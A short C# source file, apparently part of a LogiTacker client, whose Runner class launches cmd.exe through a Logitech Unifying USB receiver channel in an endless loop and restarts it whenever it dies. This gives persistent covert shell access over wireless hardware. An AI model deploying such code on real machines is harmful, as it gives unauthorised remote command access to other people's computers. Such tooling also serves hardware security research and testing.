using System;

namespace LogitackerClient
{
    public class Runner
    {
        public static void Run()
        {
            Console.WriteLine("Start shell and wait for traffic on Unifying receiver...");
            UnifyingUSB uu = new UnifyingUSB();
            while (true)
            {
                uu.RunShell("cmd.exe", "");
                Console.WriteLine("Shell died ... restarting");
            }
        }
    }
}
